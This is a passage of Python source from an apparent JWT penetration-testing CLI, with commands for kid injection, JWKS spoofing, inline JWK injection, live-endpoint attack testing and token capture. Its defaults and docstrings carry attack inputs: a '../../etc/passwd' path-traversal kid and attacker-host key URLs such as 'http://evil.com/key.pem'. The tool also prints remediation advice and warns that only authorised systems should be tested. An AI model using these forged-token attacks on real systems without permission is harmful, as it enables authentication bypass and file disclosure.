            click.echo("\n⚠️  Provide --url to test the forged tokens against an endpoint")

        # Summary and recommendations
        click.echo("\n" + "=" * 60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("=" * 60)
        click.echo(f"✅ Secret recovered: '{found_secret}' (alg: {algorithm})")
        if url:
            click.echo("✅ Endpoint testing completed")

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
        click.echo("• Consider switching to RS256 (asymmetric) algorithm")
        click.echo("• Implement proper secret rotation policies")
        click.echo("• Never use default or common secrets")

        if found_secret in ["secret", "password", "123456", ""]:
            click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("test-kid-injection")
@click.argument("token")
@click.option("--kid-payload", default="../../etc/passwd", help="Kid injection payload")
@click.option("--payload", help="Custom JWT payload to inject (JSON format)")
@click.option("--url", "-u", help="Target URL to test kid injection against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, timeout):
    """Test Key ID (kid) injection vulnerability

    \b
    🗝️ HIGH → CRITICAL SEVERITY ATTACK
    Key ID (kid) injection - depends on backend implementation:

    1️⃣ Injecting malicious kid parameter
    2️⃣ Testing local file paths: "kid": "../../etc/passwd"
    3️⃣ Testing remote URLs: "kid": "http://attacker/key.pem"
    4️⃣ Signing token with controlled key
    5️⃣ Testing real API access

    \b
    🧪 Expected Exploitation:
    • File disclosure (path traversal)
    • Validation with arbitrary keys
    • Remote key fetching from attacker server
    • Potential RCE in vulnerable parsers

    \b
    Examples:
      # Basic kid injection test
      python apileaks.py jwt test-kid-injection TOKEN

      # Test with custom kid payload
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"

      # Test with custom JWT payload
      python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'

      # Test against real endpoint with both custom payloads
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "../../etc/passwd" --payload '{"admin":true}' --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Key ID (kid) Injection Attack")
        click.echo("=" * 40)
        click.echo("🔥 SEVERITY: HIGH → CRITICAL (depends on backend)")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ":" not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(":", 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated kid
        # injection payload set; a custom --payload is merged onto the base token.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded["payload"])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded["header"], merged, "secret")

        _run_jwt_vector(base_token, AttackType.KID_INJECTION, url, custom_headers, data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Validate and sanitize kid parameter before use")
        click.echo("• Use allowlist of permitted key identifiers")
        click.echo("• Never use kid parameter directly in file paths or URLs")
        click.echo("• Implement proper input validation and path traversal protection")
        click.echo("• Avoid dynamic key loading based on user input")
        click.echo("• Use static key stores with predefined key identifiers")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("test-jwks-spoof")
@click.argument("token")
@click.option("--jwks-url", default="http://attacker.com/jwks.json", help="Malicious JWKS URL")
@click.option("--url", "-u", help="Target URL to test JWKS spoofing against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
    """Test JWKS spoofing vulnerability

    \b
    JWKS spoofing - breaks trust boundary by:

    1️⃣ Detecting JWKS endpoint usage\b
    2️⃣ Spoofing remote JWKS URL\b
    3️⃣ Publishing attacker-controlled keys\b
    4️⃣ Signing token with attacker key\b
    5️⃣ Testing real API access\b


    \b
    Examples:
      # Basic JWKS spoofing test
      python apileaks.py jwt test-jwks-spoof TOKEN

      # Test with custom malicious JWKS URL
      python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json

      # Test against real endpoint
      python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 JWKS Spoofing Attack")
        click.echo("=" * 30)
        click.echo("🔥 SEVERITY: CRITICAL - Trust Boundary Broken")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ":" not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(":", 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # jku/x5u spoofing URL set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.JWKS_SPOOF, url, custom_headers, data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
        click.echo("• Validate JWKS URLs against strict patterns")
        click.echo("• Use certificate pinning for JWKS endpoints")
        click.echo("• Implement network-level restrictions for JWKS fetching")
        click.echo("• Never trust user-controlled jku or x5u parameters")
        click.echo("• Consider using static key stores instead of dynamic JWKS")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("test-inline-jwks")
@click.argument("token")
@click.option("--url", "-u", help="Target URL to test inline JWKS injection against (optional)")
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers for endpoint testing (format: "Name: Value")',
)
@click.option("--data", "-d", help="POST data for endpoint testing")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.pass_context
def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
    """Test inline JWKS injection vulnerability

    \b
    Inline JWKS injection - total cryptographic validation control by:

    1️⃣ Generating attacker's own key pair\n
    2️⃣ Injecting JWKS inline in header\b
    3️⃣ Signing JWT with attacker's private key\b
    4️⃣ Sending token with embedded public key\b
    5️⃣ Testing admin access\b


    \b
    Examples:
      # Basic inline JWKS test
      python apileaks.py jwt test-inline-jwks TOKEN

      # Test against real endpoint
      python apileaks.py jwt test-inline-jwks TOKEN --url https://api.example.com/admin

      # Test with custom headers
      python apileaks.py jwt test-inline-jwks TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 Inline JWKS Injection Attack")
        click.echo("=" * 35)
        click.echo("🔥 SEVERITY: CRITICAL - Total Cryptographic Control")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ":" not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(":", 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # inline-JWK set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.INLINE_JWKS, url, custom_headers, data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• NEVER trust inline JWK parameters in JWT headers")
        click.echo("• Implement strict JWK source validation")
        click.echo("• Use static key stores with predefined keys only")
        click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
        click.echo("• Implement proper key management with trusted sources")
        click.echo("• Use certificate pinning for key validation")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command("attack-test")
@click.argument("token", required=False)
@click.option("--url", "-u", help="Target URL to test JWT attacks against")
@click.option(
    "--method",
    "-X",
    "method",
    type=click.Choice(["GET", "POST", "PUT", "PATCH", "DELETE"], case_sensitive=False),
    help="HTTP method to use for requests (default: POST if --data is set, otherwise GET)",
)
@click.option(
    "--header",
    "-H",
    multiple=True,
    help='Custom headers (format: "Name: Value"). Can be used multiple times.',
)
@click.option("--data", "-d", help="POST data for request body (JSON format recommended)")
@click.option("--timeout", default=30, help="Request timeout in seconds (default: 30)")
@click.option(
    "--no-ssl-verify", is_flag=True, help="Disable SSL certificate verification for testing"
)
@click.option(
    "--max-retries", default=3, help="Maximum retry attempts for failed requests (default: 3)"
)
@click.option(
    "--fuzz-target",
    "fuzz_target",
    help="Claim or header name to fuzz with values from --vector-file (Req 63.1)",
)
@click.option(
    "--vector-file",
    "vector_file",
    type=click.Path(),
    help="File of fuzz values (one per line) substituted into --fuzz-target (Req 63.6)",
)
@click.option(
    "--raw-request",
    "raw_request",
    type=click.Path(),
    help="Raw HTTP request file supplying the request context and JWT (Req 67.1)",
)
@click.option(
    "--canary",
    help="Expected-success string that corroborates (never replaces) analyzer success (Req 67.3)",
)
@click.pass_context
def jwt_attack_test(
    ctx,
    token,
    url,
    method,
    header,
    data,
    timeout,
    no_ssl_verify,
    max_retries,
    fuzz_target,
    vector_file,
    raw_request,
    canary,
):
    """Comprehensive JWT attack testing against live endpoints

    Performs automated security testing of JWT tokens against live API endpoints
    to identify common JWT vulnerabilities. This command executes multiple attack
    vectors and provides detailed vulnerability assessment with evidence.

    \b
    Attack Vectors Tested:
    • Algorithm Confusion Attacks
      - alg:none bypass (removes signature requirement)
      - Null signature attacks (various bypass techniques)
      - Algorithm downgrade (RS256 to HS256 confusion)

    • Secret-Based Attacks
      - Weak HMAC secret brute-force using common wordlists
      - Empty secret testing
      - Predictable secret patterns

    • Injection Attacks
      - Key ID (kid) injection (path traversal, command injection)
      - JWKS URL spoofing (jku parameter manipulation)
      - Inline JWKS injection (embed malicious public keys)

    • Payload Manipulation
      - Privilege escalation (modify role/admin claims)
      - User impersonation (change user identifier claims)
      - Expiration bypass (remove or extend exp claims)

    \b
    Response Analysis:
    • Compares attack responses against baseline (original token)
    • Detects authentication bypass indicators
    • Identifies privilege escalation attempts
    • Analyzes response timing for blind vulnerabilities
    • Provides confidence scoring for findings

    \b
    Required Arguments:
      TOKEN                 JWT token to use as base for attack generation

    \b
    Required Options:
      -u, --url URL         Target endpoint URL to test attacks against
                           Must be a complete URL (e.g., https://api.example.com/protected)

    \b
    Optional Parameters:
      -H, --header TEXT     Custom HTTP headers to include in all requests
                           Format: "Header-Name: Header-Value"
                           Can be specified multiple times for different headers
                           Example: -H "Authorization: Bearer token" -H "X-API-Key: key123"

      -d, --data TEXT       POST data to include in request body
                           Recommended format: JSON string
                           Example: -d '{"userId": 123, "action": "read"}'

      --timeout INTEGER     HTTP request timeout in seconds (default: 30)
                           Increase for slow endpoints or networks

      --no-ssl-verify       Disable SSL certificate verification
                           Use for testing against self-signed certificates
                           WARNING: Only use in testing environments

      --max-retries INTEGER Maximum retry attempts for failed requests (default: 3)
                           Helps handle temporary network issues

    \b
    Basic Usage Examples:
      # Test JWT against a protected endpoint
      python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... --url https://api.example.com/user/profile

      # Test with custom authentication header
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/admin -H "X-API-Key: secret123"

      # Test POST endpoint with request body
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/update -d '{"name": "test"}'

    \b
    Advanced Usage Examples:
      # Multiple custom headers with extended timeout
      python apileaks.py jwt attack-test TOKEN -u URL \\
        -H "Authorization: Bearer backup-token" \\
        -H "X-Forwarded-For: 127.0.0.1" \\
        -H "User-Agent: Mobile-App/1.0" \\
        --timeout 60

      # Testing against development server with self-signed certificate
      python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected \\
        --no-ssl-verify --max-retries 5

      # Complex POST request with JSON payload
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/transactions \\
        -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \\
        -H "Content-Type: application/json"

    \b
    Output and Results:
    • Real-time progress display with attack status
    • Detailed vulnerability findings with severity levels
    • Evidence and exploitation steps for successful attacks
    • Files saved to 'jwtattack/[session-id]/' directory:
      - tokens/: Generated attack tokens (*.jwt files)
      - responses/: HTTP response details (*.json files)
      - reports/: Human-readable and machine-parseable reports
      - baseline_response.json: Original token response for comparison

    \b
    Exit Codes:
      0    No vulnerabilities found or low/medium severity only
      1    High severity vulnerabilities detected
      2    Critical vulnerabilities detected
      130  Interrupted by user (Ctrl+C)

    \b
    Security Notes:
    • Only test against systems you own or have explicit permission to test
    • This tool generates multiple HTTP requests - be mindful of rate limits
    • Some attacks may trigger security monitoring - ensure proper authorization
    • Results should be verified manually before reporting as vulnerabilities

    \b
    Integration with Existing JWT Commands:
    • Uses same JWT utilities as other jwt subcommands for consistency
    • Leverages existing attack logic from test-alg-none, brute-secret, etc.
    • Compatible with tokens generated by 'jwt encode' command
    • Output format consistent with other APILeak reporting
    """
    try:
        # ------------------------------------------------------------------
        # Resolve new-option inputs BEFORE any request is issued (Reqs 63.6,
        # 67.1, 67.2). Each source is consumed up-front so an unreadable
        # Vector_File or an unparseable/token-less Raw_Request_Input aborts the
        # command with a descriptive error naming the offending file, and no
        # HTTP request is ever attempted.
        #
        # When no new option is supplied the token/url/headers/data resolve to
        # exactly the pre-existing single-token behavior (Req 67.5).
        # ------------------------------------------------------------------
        raw_parsed = None
        if raw_request:
            try:
                raw_parsed = parse_raw_request(raw_request)
            except ValueError as e:
                click.echo(f"❌ {e}", err=True)
                sys.exit(1)
            # The parsed request supplies the JWT and the request context.
            token = raw_parsed.token
            if not url:
                url = raw_parsed.url
            if not data:
                data = raw_parsed.body

        # A token must come from either the positional argument or the raw
        # request file.
        if not token:
            click.echo("❌ No JWT token supplied. Provide TOKEN or --raw-request FILE.", err=True)
            sys.exit(1)

        # A live target is required for attack execution (preserved from the
        # original --url requirement); it may originate from --url or the raw
        # request file.
        if not url:
            click.echo(
                "❌ No target URL supplied. Provide --url or a --raw-request "
                "file with a Host header.",
                err=True,
            )
            sys.exit(1)

        # Read the Vector_File up-front so an unreadable file aborts before any
        # request, naming the file (Req 63.6). Fuzzing needs both a target name
        # and a value file; requiring them together avoids a silently inert
        # option.
        fuzz_values = None
        if vector_file and not fuzz_target:
            click.echo(
                "❌ --vector-file requires --fuzz-target naming the claim or header to fuzz.",
                err=True,
            )
            sys.exit(1)
        if fuzz_target and not vector_file:
            click.echo(
                "❌ --fuzz-target requires --vector-file supplying the fuzz values.", err=True
            )
            sys.exit(1)
        if vector_file:
            try:
                fuzz_values = read_vector_file(vector_file)
            except ValueError as e:
                click.echo(f"❌ {e}", err=True)
                sys.exit(1)

        # Validate JWT token first
        try:
            decoded_token = decode_jwt(token)
            click.echo("🔍 JWT Token Analysis")
            click.echo("=" * 50)
            click.echo(f"Algorithm: {decoded_token['header'].get('alg', 'Unknown')}")
            click.echo(f"Token Type: {decoded_token['header'].get('typ', 'Unknown')}")
            if "sub" in decoded_token["payload"]:
                click.echo(f"Subject: {decoded_token['payload']['sub']}")
            if "exp" in decoded_token["payload"]:
                import datetime

                exp_time = datetime.datetime.fromtimestamp(decoded_token["payload"]["exp"])
                click.echo(f"Expires: {exp_time.strftime('%Y-%m-%d %H:%M:%S UTC')}")
            click.echo("")
        except Exception as e:
            click.echo(f"❌ Invalid JWT token: {e}", err=True)
            sys.exit(1)

        # Parse custom headers. When a raw request file was supplied its parsed
        # headers seed the request context (Req 67.1); explicit -H options then
        # override on a per-name basis.
        custom_headers = {}
        if raw_parsed is not None:
            custom_headers.update(raw_parsed.headers)
        for h in header:
            if ":" not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(":", 1)
            custom_headers[name.strip()] = value.strip()

        # Display attack configuration
        click.echo("🎯 Attack Configuration")
        click.echo("=" * 50)
        click.echo(f"Target URL: {url}")
        if custom_headers:
            click.echo("Custom Headers:")
            for name, value in custom_headers.items():
                # Mask sensitive headers for display
                if name.lower() in ["authorization", "cookie", "x-api-key"]:
                    masked_value = value[:10] + "..." if len(value) > 10 else "***"
                    click.echo(f"  {name}: {masked_value}")
                else:
                    click.echo(f"  {name}: {value}")
        if data:
            click.echo(f"POST Data: {data[:100]}{'...' if len(data) > 100 else ''}")
        click.echo(f"Timeout: {timeout}s")
        click.echo(f"SSL Verification: {'Disabled' if no_ssl_verify else 'Enabled'}")
        click.echo(f"Max Retries: {max_retries}")
        if raw_request:
            click.echo(f"Raw Request File: {raw_request}")
        if fuzz_target:
            click.echo(
                f"Fuzz Target: {fuzz_target} ({len(fuzz_values or [])} value(s) from {vector_file})"
            )
        if canary:
            click.echo("Canary: (supplied — corroborates analyzer success)")
        click.echo("")

        # Route all attack-token generation and execution through the single-
        # source-of-truth JWTAttackEngine (Requirements 14.2, 14.3), issuing HTTP
        # through the shared HTTPRequestEngine (Requirement 17.1). Success is
        # decided by the engine's response analyzer, not keyword presence
        # (Requirements 19.1, 19.2).
        from core.config import RateLimitConfig
        from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig

        async def run_attack_test():
            rate_limiter = RateLimiter(RateLimitConfig())
            retry_config = RetryConfig(max_attempts=max_retries)
            http_engine = HTTPRequestEngine(
                rate_limiter, retry_config, timeout=timeout, verify_ssl=not no_ssl_verify
            )
            try:
                engine = _make_jwt_engine(
                    token,
                    url,
                    custom_headers,
                    data,
                    http_engine=http_engine,
                    method=method,
                    fuzz_target=fuzz_target,
                    fuzz_values=fuzz_values,
                    canary_value=canary,
                )

                click.echo("🚀 Starting JWT Attack Testing...")
                click.echo("=" * 50)

                attack_summary = await engine.execute_all()
            finally:
                await http_engine.close()

            # Display results summary
            click.echo("\n" + "=" * 60)
            click.echo("JWT Attack Testing Results")
            click.echo("=" * 60)

            session = attack_summary.session
            click.echo(f"Session ID: {session.session_id}")
            click.echo(
                f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A"
            )
            click.echo(f"Total Attacks: {session.total_attacks}")
            click.echo(f"Successful Attacks: {session.successful_attacks}")
            click.echo(f"Success Rate: {session.success_rate:.1f}%")

            # Show vulnerability summary (analyzer-based, Req 19.1/19.3)
            if attack_summary.vulnerabilities_found:
                click.echo(
                    f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}"
                )
                for vuln in attack_summary.vulnerabilities_found:
                    severity_icon = (
                        "🔴"
                        if vuln.vulnerability_assessment.severity.value == "Critical"
                        else "🟠"
                        if vuln.vulnerability_assessment.severity.value == "High"
                        else "🟡"
                    )
                    click.echo(
                        f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value}, confidence {vuln.vulnerability_assessment.confidence_score:.2f})"
                    )

            if attack_summary.potential_vulnerabilities:
                click.echo(
                    f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}"
                )
                for vuln in attack_summary.potential_vulnerabilities:
                    click.echo(
                        f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})"
                    )

            if (
                not attack_summary.vulnerabilities_found
                and not attack_summary.potential_vulnerabilities
            ):
                click.echo("\n✅ No vulnerabilities detected")

            # Exit with appropriate code based on findings
            if attack_summary.has_critical_findings:
                click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
                sys.exit(2)
            elif attack_summary.has_high_findings:
                click.echo("\n🟠 Exiting with code 1 due to high severity vulnerabilities")
                sys.exit(1)
            else:
                click.echo("\n✅ Attack testing completed successfully")
                sys.exit(0)

        # Run the async attack test
        asyncio.run(run_attack_test())

    except KeyboardInterrupt:
        click.echo("\n❌ Attack testing interrupted by user")
        sys.exit(130)
    except Exception as e:
        click.echo(f"\n❌ Attack testing failed: {e}", err=True)
        sys.exit(1)


@jwt.command("login")
@click.option(
    "--url", "-u", required=True, help="Login endpoint URL (e.g. http://HOST/api/v1.0/login)"
)
@click.option(
    "--body",
    "-d",
    default="{}",
    help="JSON body with credentials (default: {}). "
    'Example: \'{"username":"user","password":"pass"}\'',
)
@click.option(
    "--method",
    "-X",
    default="POST",
    type=click.Choice(["POST", "GET", "PUT"], case_sensitive=False),
    help="HTTP method (default: POST)",
)
@click.option(
    "--header", "-H", multiple=True, help='Extra headers (format: "Name: Value"). Repeatable.'
)
@click.option(
    "--token-field",
    default=None,
    help="JSON field name that contains the token in the response. "
    "If omitted, the command searches common field names "
    "(token, access_token, jwt, id_token, accessToken).",
)
@click.option(
    "--save",
    type=click.Path(),
    default=None,
    help="Save the captured token to this file path. Example: --save /tmp/token.jwt",
)
@click.option("--no-ssl-verify", is_flag=True, help="Disable SSL certificate verification.")
@click.option("--timeout", default=30, show_default=True, help="Request timeout in seconds.")
@click.pass_context
def jwt_login(ctx, url, body, method, header, token_field, save, no_ssl_verify, timeout):
    """POST credentials to a login endpoint and capture the returned JWT.

    The captured token is printed to stdout so it can be piped directly into
    other jwt subcommands, and optionally saved to a file with --save.

    \b
    Examples:
      # Basic login, token printed to terminal
      python apileaks.py jwt login \\
          --url http://MACHINEIP/api/v1.0/example2 \\
          --body '{"username":"user","password":"password2"}'

      # Save token to file, then use it for attack testing
      python apileaks.py jwt login \\
          --url http://HOST/api/v1.0/login \\
          --body '{"username":"admin","password":"admin123"}' \\
          --save /tmp/captured.jwt

      python apileaks.py jwt attack-test $(cat /tmp/captured.jwt) \\
          --url http://HOST/api/v1.0/protected

      # Custom token field name
      python apileaks.py jwt login \\
          --url http://HOST/auth \\
          --body '{"user":"bob","pass":"secret"}' \\
          --token-field auth_token
    """
    import httpx

    # Parse body
    try:
        body_dict = json.loads(body)
    except json.JSONDecodeError as exc:
        click.echo(f"❌ --body is not valid JSON: {exc}", err=True)
        sys.exit(1)

    # Parse headers
    request_headers = {"Content-Type": "application/json"}
    for h in header:
        if ":" not in h:
            click.echo(f"❌ Invalid header format: {h!r}. Use 'Name: Value'.", err=True)
            sys.exit(1)
        name, value = h.split(":", 1)
        request_headers[name.strip()] = value.strip()

    # Common field names to search when --token-field is not specified
    _COMMON_FIELDS = [
        "token",
        "access_token",
        "jwt",
        "id_token",
        "accessToken",
        "auth_token",
        "bearer",
        "Authorization",
    ]

    click.echo(f"🔐 Sending {method.upper()} to {url} ...")

    try:
        with httpx.Client(verify=not no_ssl_verify, timeout=timeout) as client:
            response = client.request(
                method.upper(),
                url,
                json=body_dict,
                headers=request_headers,
            )

        click.echo(f"   Status: {response.status_code}")

        # Try to parse JSON response
        try:
            data = response.json()
        except Exception:
            click.echo("❌ Response is not JSON. Raw body:", err=True)
            click.echo(response.text, err=True)
            sys.exit(1)

        # Locate the token
        captured_token = None
        found_field = None

        if token_field:
            # Explicit field name
            if token_field in data:
                captured_token = data[token_field]
                found_field = token_field
            else:
                click.echo(
                    f"❌ Field '{token_field}' not found in response. "
                    f"Available keys: {list(data.keys())}",
                    err=True,
                )
                sys.exit(1)
        else:
            # Auto-detect
            for field in _COMMON_FIELDS:
                if field in data and isinstance(data[field], str) and data[field].strip():
                    captured_token = data[field].strip()
                    found_field = field
                    break

        if not captured_token:
            click.echo(
                "❌ Could not locate a JWT in the response. "
                "Use --token-field to specify the field name.\n"
                f"Response keys: {list(data.keys())}",
                err=True,
            )
            sys.exit(1)

        # Strip "Bearer " prefix if present
        if captured_token.lower().startswith("bearer "):
            captured_token = captured_token[7:].strip()

        click.echo(f"\n✅ Token captured from field: '{found_field}'")
        click.echo("─" * 60)
        click.echo(captured_token)
        click.echo("─" * 60)

        # Decode and display summary
        try:
            decoded = decode_jwt(captured_token)
            alg = decoded["header"].get("alg", "?")
            sub = decoded["payload"].get("sub") or decoded["payload"].get("user") or "—"
            exp = decoded["payload"].get("exp")
            exp_str = ""
            if exp:
                import datetime

                exp_str = (
                    f"  exp: {datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')}"
                )
            click.echo(f"   alg={alg}  sub={sub}{exp_str}")
        except (ValueError, TypeError, OverflowError, OSError) as exc:
            # Non-critical — still output the raw token below.
            get_logger("jwt").debug("Could not render decoded JWT claims", error=str(exc))

        # Save to file if requested
        if save:
            save_path = Path(save)
            save_path.parent.mkdir(parents=True, exist_ok=True)
            save_path.write_text(captured_token, encoding="utf-8")
            click.echo(f"\n💾 Token saved to: {save_path}")
            click.echo(f"   Use with: python apileaks.py jwt decode $(cat {save_path})")

    except httpx.ConnectError as exc:
        click.echo(f"❌ Connection failed: {exc}", err=True)
        sys.exit(1)
    except httpx.TimeoutException:
        click.echo(f"❌ Request timed out after {timeout}s.", err=True)
        sys.exit(1)
    except Exception as exc:
        click.echo(f"❌ Unexpected error: {exc}", err=True)
        sys.exit(1)
